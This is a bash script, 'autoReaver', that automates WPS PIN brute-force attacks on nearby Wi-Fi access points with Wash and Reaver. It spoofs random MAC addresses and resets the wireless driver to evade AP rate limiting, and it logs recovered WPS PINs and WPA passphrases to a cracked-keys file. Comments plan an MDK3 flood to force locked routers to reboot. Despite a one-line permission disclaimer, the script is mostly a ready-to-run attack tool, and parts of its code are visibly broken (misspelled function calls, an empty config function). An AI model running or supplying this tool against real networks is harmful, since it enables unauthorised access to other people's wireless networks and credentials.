#!/bin/bash

###################################################################################################################################################
###### This is a bash script that automates  multiple AP attack using Reaver and a List of BSSIDs from a text file generated by Wash.
###### Remember to ask permission or use it with your onwn AP, be responsible. tested successfully with unpatched or older routers using  WPS 1.0.
###### More recent devices will lock you down (AP rate limit), in this case the script loops to the next BSSID on the list.
###### Just execute the script, ./autoReaver, you will be prompt to select a WIFI device from a list of devices available,
###### WIFI devices info are retrieved from the path in Kali /sys/class/ieee80211
###### if at least one physical device is present, inside ieee80211 directory will apear phy0 or phy(#) directory(s), according to how many devices are plugged
###### this works in Kali, in other distros if paths are different you must change them in configurationSetting file.
###### A Wash list is generated by Autoreaver, you will be asked to select 1 AP or ALL.
###### You can adjust some Reaver settings during the script execution or manually change them in configurationSettings file.
###### In the end, after it loops all BSSID list, the script will exit after stoping Monitor Mode, reseting device driver and
###### restarting Netwok Manager service, systemctl restart NetworkManager .
###### Found WPS-PIN And WPA-PSK are stored in CRACKED directory.
###################################################################################################################################################
###### REQUIREMENTS:
###### Reaver v1.6.6 (the version im using, dont know with older versions)
###### Macchanger
###### Airmon-ng, Aireplay-ng
###### Konsole
###### Wash
###################################################################################################################################################
###### DBus Server launch ERROR issue, please visit https://www.kali.org/docs/general-use/xfce-with-rdp/
###################################################################################################################################################

clear;

if [ "$EUID" -ne 0 ]; then
	echo "Please run as root!!!";
	exit;
fi

source $(pwd)"/configurationSettings";

###########################################################################################################################
###################################################### FUNCTIONS ##########################################################
###########################################################################################################################

echoWhite(){
	echo "$(tput setaf 7)${1}$(tput sgr0)";
}

echoBlue(){
	echo "$(tput setaf 4)${1}$(tput sgr0)";
}

echoRed(){
        echo "$(tput setaf 1)${1}$(tput sgr0)";
}

echoOrange(){
        echo "$(tput setaf 11)${1}$(tput sgr0)";
}

echoGreen(){
        echo "$(tput setaf 34)${1}$(tput sgr0)";
}

setDeviceSettings(){
        if [ ! -d "$PATH_IEEE" ] || [ ! "$(ls -A $PATH_IEEE)" ]; then
                echoWhite "---------------------------";
                echoRed "No WIFI Devices Detected!!!";
                echoWhite "---------------------------";
                echo "";
		exitAutoReaver;
	fi

	local COUNT_DEV=1;
	local STR;
	local DRIVER;
	local LOGICAL;
	local PHY;
	local WIFICHOICE;

	unset option ARR_DEVICES  ERROR;
	declare -a ARR_DEVICES;

	echoBlue "#		Physical	Device          Driver";
	echoWhite "-----------------------------------------------------------"

	for PHY in $(ls $PATH_IEEE); do
	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c 5-${#STR});
	        LOGICAL=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
	        echoBlue "$COUNT_DEV		$PHY		$LOGICAL        $DRIVER";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$PHY";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$LOGICAL";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$DRIVER";
	        COUNT_DEV=$((COUNT_DEV+1));
	done

	echo"";

	while true; do
	        read -p "Choose WIFI Device: " WIFICHOICE;

		if [[ $WIFICHOICE -le ${#ARR_DEVICES[@]}/3 && $WIFICHOICE -gt 0 ]]; then
			WIFI_CARD_DRIVER="${ARR_DEVICES[(WIFICHOICE*3)-1]}";
			WIFI_CARD_LOGICAL="${ARR_DEVICES[(WIFICHOICE*3)-2]}";
			WIFI_CARD_PHY="${ARR_DEVICES[(WIFICHOICE*3)-3]}";
			break;
		else
			echoOrange "InValid Selection...";
		fi
	done

	echo "";
	echoBlue "Checking if Selected Device is in Monitor Mode......";
	echo "";

	getMonitorName;

	if [ ! -z $WIFI_CARD_MONITOR  ]; then
		stopMonitor;
	fi

	sleep 2;

	unset ARR_DEVICES;
}

setAPSettings(){
	local LINE;
	local i;
	local APCHOICE;
	local YN;
	local nTIME;
	local CMD_WASH;
	local WASH_SCAN=1;

	if [[ -f $REAVER_TMP_DIR'/wash.list' && $RESCAN_AP -eq 0 ]]; then
		while true; do
			read -p "Use Last WASH Scan (Y/N)?" YN && echo "";

			case $YN in
				[Yy]* )
					WASH_SCAN=0;
					break;;
				[Nn]* )
					WASH_SCAN=1;
					break;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done
	else
		WASH_SCAN=1;
	fi

	if [[ $WASH_SCAN -eq 1 ]]; then
		while true; do
			read -p "AP Scan Time Set to $WASH_TIME Sec., Change (Y/N)? " YN;

			case $YN in
				[Yy]* )
					while true; do
						read -p "Set New Scan Time [Current $WASH_TIME Sec.], (1-120): " nTIME

						if [[ $nTIME -ge 1 && $nTIME -le 120 ]]; then
							WASH_TIME=$nTIME;
							break;
						else
							echoOrange "Invalid Selection......";
						fi
					done
					;;
				[Nn]* )
					break;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done

		echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
		echoBlue "Please Wait...";
		echo "";

		CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
		eval $CMD_WASH >>/dev/null;
	fi

	unset option AP_LIST ERROR;
	declare -a AP_LIST;

	while IFS= read -r LINE; do
		AP_LIST[${#AP_LIST[@]}]="$LINE";
	done < "$REAVER_TMP_DIR/wash.list"

	if [ ${#AP_LIST[@]} -eq 2 ]; then
		echoRed "No Targets in AP List...";
		echoBlue "Try Increase WASH Scan Time...";

		while true; do
			read -p "ReScan APs (Y/N)? " YN;

			case $YN in
				[Yy]* )
					RESCAN_AP=1;
					setAPSettings;;
				[Nn]* )
					echoBlue "Exiting..."
					exitAutoReaver;;
				* )
					echoOrange "Invalid Selection......";;
			esac
		done
	fi

	for (( i=0; i<${#AP_LIST[@]}; i++ )); do
		case $i in
			0)
				echoBlue "#       ${AP_LIST[$i]}";;
			1)
				echoWhite  "${AP_LIST[$i]}";;
			* )
				if [[ $(awk '{ print $5 }' <<< "${AP_LIST[$i]}") == "Yes" ]]; then
					echoRed "$((i-1))       ${AP_LIST[$i]}";
				elif [[ $(awk '{ print $4 }' <<< "${AP_LIST[$i]}") == "2.0" ]]; then
					echoOrange "$((i-1))	${AP_LIST[$i]}";
				else
					echoGreen "$((i-1))      ${AP_LIST[$i]}";
				fi
		esac
	done

	echo "";

	while true; do
		read -p "Choose AP (1-$((${#AP_LIST[@]}-2))), (0) to All, (R)escan : " APCHOICE;

		if [[ $APCHOICE -le ${#AP_LIST[@]}-2 && $APCHOICE -gt 0 ]]; then
			AP_BSSID=$(awk '{ print $1 }' <<< "${AP_LIST[$APCHOICE+1]}");
			AP_CHANNEL=$(awk '{ print $2 }' <<< "${AP_LIST[$APCHOICE+1]}");
			AP_ESSID=$(awk '{ print $7 }' <<< "${AP_LIST[$APCHOICE+1]}");
			AP_WPS=$(awk '{ print $4 }' <<< "${AP_LIST[$APCHOICE+1]}");
			AP_LOCK=$(awk '{ print $5 }' <<< "${AP_LIST[$APCHOICE+1]}");
			break;
		else
			if [[ "$APCHOICE" == "0" ]]; then
				###### All option will allow this script to loop the wash output result
				echoRed "All... is Currently Unavailable. Please Select Single Target.";
			elif [[ "$APCHOICE" == "r" || "$APCHOICE" == "R" ]]; then
				clear;
				RESCAN_AP=1;
				setAPSettings;
				break;
			else
				echoOrange "Invalid Selection......";
			fi
		fi
	done

	unset AP_LIST;
	RESCAN_AP=0;
}

setAutoReaverOpt(){
	local YN;
	local SEC
	local ATTEMPT;

	while true; do
        	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " YN;

		case $YN in
			[Yy]* )
				break;;
			[Nn]* )
				read -p "Please Enter New Fake Authentication Value: " SEC;

				if [[ $SEC -lt 61 && $SEC -gt 0 ]]; then
		                        FAKE_AUTH_DELAY_SECONDS=$SEC;
					break;
	       	       		else
	        	                echoOrange "Invalid Value...";
				fi;;
			* )
		esac
	done

        while true; do
                read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " YN;

                case $YN in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter PIN Attempts: " ATTEMPT;

                                if [ $ATTEMPT -gt 0 ]; then
                                        REAVER_PIN_ATTEMPTS=$ATTEMPT;
                                        break;
                                else
                                        echoOrange "Invalid Value...";
                                fi;;
                        * )
                esac
        done

        while true; do
                read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " YN;

                case $YN in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter New Attempt Delay Value: " SEC;

                                if [ $SEC -gt 0 ]; then
                                        REAVER_ATTEMPT_DELAY=$SEC;
                                        break;
                                else
                                        echoOrange "Invalid Value...";
                                fi;;
                        * )
                esac
        done

	while true; do
		echoWhite "Use Addiciotal Reaver Options:";
		echoWhite "-E: Terminate each WPS session with an EAP FAIL packet";
		echoWhite "-S: Use small DH keys to improve crack speed";
		echoWhite "-N: Do not send NACK messages when out of order packets are received";
		echoWhite "-T 1: Set the M5/M7 timeout period";
		echoWhite "-t 15: Set the receive timeout period";
		echoWhite "--win7: Mimic a Windows 7 registrar";

                read -p "(Y/N)? " YN;

                case $YN in
                        [Yy]* )
				ADDITIONAL_OPTIONS_YN="Yes";
                                break;;
                        [Nn]* )
				ADDITIONAL_OPTIONS_YN="No";
				break;;
                        * )
                esac
        done
}

reaverConfig(){
	unset option ARR_REAVER_OPT;
	declare ARR_REAVER_OPT;



	unset ARR_REAVER_OPT;
}

checkAPLockStatus(){
	local CMD_LOCK_STATUS;
	local WASH_OUTPUT;
	local AP_DETECTED=0;

	CMD_LOCK_STATUS="timeout --preserve-status $CHECK_APLOCK_TIMEOUT wash -i $WIFI_CARD_MONITOR";
	echoBlue "Checking AP Lock Status (Timeout For Result In $CHECK_APLOCK_TIMEOUT Sec)......";

	if [[ ! -f $STATUS_FILE ]]; then
		touch $STATUS_FILE;
		ehoGreen "Status File for $AP_BSSID Created......";
	else
		choBlue "Status File for $AP_BSSID Found......";
	fi

	eval $CMD_LOCK_STATUS | {
		while read -r WASH_OUTPUT; do
			if [[ $(echo "$WASH_OUTPUT" | grep -ic "$AP_BSSID") != 0 ]]; then
				AP_DETECTED=1;

				if [[ $(awk '{ print $5 }' <<< $WASH_OUTPUT) -eq "Yes" ]]; then
					echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_CHECK_STATUS_LOCKED") >> $STATUS_FILE;
					echoRed "AP Is Locked......";
				else
					echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_CHECK_STATUS_UNLOCKED") >> $STATUS_FILE;
					echoGreen "AP Is UnLocked......";
				fi
			else
				AP_DETECTED=0;
			fi
		done

		if [[ $AP_DETECTED == 0 ]]; then
			echo $(date +"%d/%m/%Y %H:%M:%S - $AP_LOCK AP_NOT_FOUND") >> $STATUS_FILE;
			echoRed "AP Not Found......";
		fi

		$(killall -I wash);
	}
}

getRandomMac(){
	sleep 1;

	ifconfig $WIFI_CARD_LOGICAL down;
	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......";
	WIFI_CARD_RNDMAC=$(macchanger -r $1 $WIFI_CARD_LOGICAL | awk '{ print $3 }' <<< "$(grep -Ei 'new.*mac:')")
	ifconfig $WIFI_CARD_LOGICAL up;
	echoGreen "$WIFI_CARD_LOGICAL New MAC Address $WIFI_CARD_RNDMAC......";
}

resetDeviceDriver(){
	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......";
	modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER

	sleep 1;

	checkIEEEPaths;
}

getMonitorName(){
	local FIND_MONITOR;

	FIND_MONITOR=$(iwconfig | grep -Ei "$WIFI_CARD_LOGICAL.*monitor")
	WIFI_CARD_MONITOR=$(awk '{ print $1 }' <<< "$FIND_MONITOR");
}

startMonitor(){
	echoBlue "Killing Processes Associated to AIRMON-NG......";

	local CMD_KILL;
	local MESSAGE;
	local CMD_START;

	if [[ $(airmon-ng check | grep -ic "pid") != 0 ]]; then
		CMD_KILL="airmon-ng check kill";
		eval $CMD_KILL >>/dev/null;
		echoGreen "Processes Killed......";
	else
		echoGreen "No Processes to Kill......";
	fi

	sleep 2;

	MESSAGE="Starting Monitor Mode on $WIFI_CARD_LOGICAL";

	if [ -z "$AP_CHANNEL" ]; then
		MESSAGE+="......";
	else
		MESSAGE+=" on Channel $AP_CHANNEL......";
	fi

	echoBlue "$MESSAGE";

	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
	eval $CMD_START >>/dev/null && getMonitorName && checkIEEEPaths;
}

stopMonitor(){
	local CMD_STOP;

	if [ -z "$WIFI_CARD_MONITOR" ]; then
		getMonitorName;
	fi

	if [ ! -z "$WIFI_CARD_MONITOR" ]; then
		echoBlue "Stopping Monitor Mode On $WIFI_CARD_LOGICAL......";
		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))";
		eval $CMD_STOP >>/dev/null && WIFI_CARD_MONITOR="" && checkIEEEPaths;
	fi
}

checkIEEEPaths(){
	local FOUND=0;
	local LOGICAL;
	local PHYSICAL;

	LOGICAL=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);

	for PHY in $(ls $PATH_IEEE); do
		PHYSICAL=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);

		if [ "$PHYSICAL" == "$LOGICAL" ]; then
			WIFI_CARD_PHY=$PHY;
			WIFI_CARD_LOGICAL=$PHYSICAL;
			FOUND=1;
		fi
	done

	if [ $FOUND == 0 ]; then
		echoRed "Something Went Wrong With WIFI Device......";
		echoBlue "Check Your WIFI Device(S).";
		exitAutoReaver;
	fi
}

checkRequisites(){
	local i;
	local CMD_COMMAND;
	local MISSING;
	local YN;

	unset option ARR_REQUISITES ERROR;
	declare -a ARR_REQUISITES="$REQUISITES";
	unset option MISS_REQUISITES ERROR;
	declare -a MISS_REQUISITES;

	echoBlue "Checking if AutoReaver Requisites are Present......";

	for (( i=0; i<${#ARR_REQUISITES[@]}; i++ )); do
		CMD_COMMAND=$(command -v "${ARR_REQUISITES[$i]}");

		if [ -z "$CMD_COMMAND" ]; then
			MISS_REQUISITES[${#MISS_REQUISITES[@]}]="${ARR_REQUISITES[$i]}";
		fi
	done

	unset ARR_REQUISITES;

	if [ ${#MISS_REQUISITES[@]} -gt 0 ]; then
		MISSING="${MISS_REQUISITES[@]}";
		echoRed "Following Requisites, $MISSING, are Missing......";

		while true; do
			read -p "Do You Want to Try to Install Missing Requisites (Y/N)? " YN;

			case $YN in
				[Yy]* )
					case "$(curl -s --max-time 2 -I $HTTP_CONN | sed 's/^[^ ]*  *\([0-9]\).*/\1/; 1q')" in
						[23]* )
							echoGreen "HTTP Connectivity is up......";

							for (( i=0; i<${#MISS_REQUISITES[@]}; i++ )); do
								echoBlue "Installing ${MISS_REQUISITES[$i]}......"

								CMD_COMMAND="sudo apt-get install ${MISS_REQUISITES[$i]} -y";
								eval $CMD_COMMAND;

								if [[ $? > 0 ]]; then
									echoRed "${MISS_REQUISITES[$i]} Failed to Install, Exiting......";
									exitAutoReaver;
								else
									echoGreen "${MISS_REQUISITES[$i]} Installed Successfuly......";
									sleep 2 && clear;
								fi
							done;;
						[5]* )
							echoRed "The Web Proxy Won't Let us Through......";
							echoBlue "Exiting......";
							exitAutoReaver;;
						* )
							echoOrange "The Network is Down or Very Slow......";
							echoBlue "Exiting......";
							exitAutoReaver;;
					esac

					break;;
				[Nn]* )
					echoBlue "Exiting......";
					exitAutoReaver;
					break;;
				* )
			esac
		done
	else
		echoGreen "All Requisites are Installed......";
		sleep 3;
	fi

	unset MISS_REQUISITES;
}

exitAutoReaver(){
	local netManagerStatus;

        if [ -z "$WIFI_CARD_MONITOR" ]; then
                getMonitorName;
        fi

        if [ ! -z "$WIFI_CARD_MONITOR" ]; then
		stopMonitor
        fi

	if [ ! -z "$WIFI_CARD_DRIVER" ]; then
		resetDeviceDriver;
	fi

	netManagerStatus=$(systemctl status NetworkManager | awk '{ print $2 }' <<< "$(grep -Ei 'Active:')");

	if [ "$netManagerStatus" = "inactive" ]; then
		echoBlue "Restarting Network Manager Service......";
		systemctl restart NetworkManager;
	fi

	exit 0;
}

###########################################################################################################################
###################################################### END FUNCTIONS ######################################################
###########################################################################################################################

if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
        echoRed "Configuration file: ./configurationSettings not present!!!";
        echoBlue "Try to recover this file, or download default version from project site, and try again";
	echo "";
        exitAutoReaver;
fi

if [[ ! -d "$REAVER_TMP_DIR" ]]; then
        mkdir -p -m 700 $REAVER_TMP_DIR;
fi

if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
        mkdir -p -m 700 $REAVER_SESSION_DIR;
fi

if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
        mkdir -p -m 700 $REAVER_CRACKED_DIR;
fi

checkRequisites;

clear;

while true; do
	PROCEED=0;

	echoWhite "Device Settings......";
	echo "";
	setDeviceSettings;
	clear;

	startMonitor;
	echoWhite "AP Settings......";
	echo "";
	setAPSettings;
	clear;

	echoWhite "AutoReaver Settings......";
	echo "";
	setAutoReaverOpt;
	clear;

	echoWhite "Device Settings --------------------------------------------------------------------";
	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
	echoBlue "Device Logical: 						$WIFI_CARD_LOGICAL";
	echoBlue "Device Physical:						$WIFI_CARD_PHY";
	echoBlue "Device Monitor:							$WIFI_CARD_MONITOR";
	echoWhite "AP Settings ------------------------------------------------------------------------";
	echoBlue "BSSID:								$AP_BSSID";
	echoBlue "Channel:							$AP_CHANNEL";
	echoBlue "WPS:								$AP_WPS";
	echoBlue "Lock State:							$AP_LOCK";
	echoBlue "ESSID:								$AP_ESSID";
	echoWhite "Reaver/Aireplay-ng Settings --------------------------------------------------------";
	echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
	echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
	echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
	echoBlue "Reaver Additional Options (-E -S -N -T 1 -t 15 --win7): 	$ADDITIONAL_OPTIONS_YN";
	echo "";

	while true; do
		read -p "Proceed (Y/N)?" yn;

		case $yn in
			[Yy]* )
				PROCEED=1;
				break;;
			[Nn]* )
				clear;
				break;;
			* )
				echoOrange "Please Answer Yes or No......";;
		esac
	done

	if [[ $PROCEED == 1 ]]; then
		break;
	fi
done

clear;

stopMonitor && resetDeviceDriver && getRandomMac &&  startMonitor;

BSSID_CLEAR=$(echo $AP_BSSID | sed s/://g);
SESSION_FILE=$REAVER_SESSION_DIR'/'$BSSID_CLEAR'.session';
STATUS_FILE=$REAVER_TMP_DIR'/'$BSSID_CLEAR'.status'

if [[ ! -f $STATUS_FILE ]]; then
	touch $STATUS_FILE;
	echoGreen "Status File for $AP_BSSID Created......";
else
	echoBlue "Status File for $AP_BSSID Found......";
fi

if [[ ! -f $CRACKED_LIST_FILE ]]; then
	echoOrange "Cracked List File Not Found......";
	touch $CRACKED_LIST_FILE;
	echoGreen "Cracked List File Created......";
else
	echoBlue "Cracked List File Found......";
fi

sleep 2;

while true; do
	#CMD_FAUTH="konsole --background-mode -e /bin/sh -c 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR'";
	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_RNDMAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS";

	eval $CMD_REAVER | {
		echo $(date +"%d/%m/%Y %H:%M:%S - - REAVER_START") >> $STATUS_FILE;

		while read -r REAVER_OUTPUT; do

			if [[ $(echo "$REAVER_OUTPUT" | grep -ic "detected ap rate limiting") != 0 ]]; then
				echoRed "[!] WARNING: Detected AP rate limiting......";
				echo $(date +"%d/%m/%Y %H:%M:%S - - AP_RATE_LIMITING") >> $STATUS_FILE
				$(killall -I reaver);
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps pin") != 0 ]]; then
				echoGreen "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - WPS_PIN_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wpa psk") != 0 ]]; then
				echoGreen "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - WPA_PSK_FOUND $(awk '{ print $4 }' <<< $REAVER_OUTPUT)") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "failed to recover wpa key") != 0 ]]; then
				echoRed "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - FAILED_TO_RECOVER_WPA_KEY") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "receive timeout occurred") != 0 ]]; then
				echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - RECEIVE_TIMEOUT") >> $STATUS_FILE;
				$(killall -I reaver);
			elif [[ $(echo "$REAVER_OUTPUT" | grep -ic "wps transaction failed") != 0 ]]; then
                                echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - WPS_TRANSACTION_FAILED") >> $STATUS_FILE;
			elif [[ $(echo "$REAVER_OUTPUT" | grep -icw "[!]") != 0 || $(echo "$REAVER_OUTPUT" | grep -icw "[-]") != 0 ]]; then
				echoOrange "$REAVER_OUTPUT";
				echo $(date +"%d/%m/%Y %H:%M:%S - - $REAVER_OUTPUT") >> $STATUS_FILE;
			else
				echoBlue "$REAVER_OUTPUT";
			fi
		done

		echo $(date +"%d/%m/%Y %H:%M:%S - - REAVER_STOP") >> $STATUS_FILE;
	}

	if [[ $(grep -icw 'ap_rate_limiting' $STATUS_FILE) != 0 ]]; then
		LCK_ATTEMPT=$((LCK_ATTEMPT+1));

		if [[ "$AP_LOCK" == "Yes" ]]; then
			echoRed "AP Locked......";
			break;
			### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
		else
			### checkLockStatus;

			if [[ "$AP_LOCK" == "Yes" ]]; then
				echoRed "AP Locked......";
				break;
				### ADDING MDK3 FLOOD ATTACK FUNCTION TO REBOOT AP IN THE FUTURE ###
			else
				if [[ $REAVER_ATTEMPT_DELAY -ge $MAX_DELAY_PIN ]]; then
					echoRed "Delay Between PIN Attempt Reached $REAVER_ATTEMPT_DELAY Sec.";
					echoBlue "AP Is Not Locked, Try running the Script Again......";
					break;
				else
					REAVER_ATTEMPT_DELAY=$((REAVER_ATTEMPT_DELAY+30))
					echoBlue  "Reaver Delay Between PIN Attempt Increased to $REAVER_ATTEMPT_DELAY Sec.";
				fi
			fi
		fi
	elif [[ $(grep -icw 'wpa_psk_found' $STATUS_FILE) != 0 ]]; then
		while read -r STATUS_LINE; do
			if [[ $(echo "$STATUS_LINE" | grep -ic "wpa_psk_found") != 0 ]]; then
				WPA_PSK=$(awk '{ print $6 }' <<< $STATUS_LINE);
				WPA_PSK=$(echo $WPA_PSK | sed s/"'"//g);
			elif [[ $(echo "$STATUS_LINE" | grep -ic "wps_pin_found") != 0 ]]; then
				WPS_PIN=$(awk '{ print $6 }' <<< $STATUS_LINE);
				WPS_PIN=$(echo $WPS_PIN | sed s/"'"//g);
			fi
		done < "$STATUS_FILE"

		echo "$AP_BSSID $AP_CHANNEL $AP_ESSID $WPS_PIN $WPA_PSK" >> $CRACKED_LIST_FILE;
		$(rm $SESSION_FILE) && $(rm $STATUS_FILE);
		break;
	fi

	stopMonitor;
	resetDeviceDriver;
	getRandomMac;
        startMonitor;
done

exitAutoReaver;
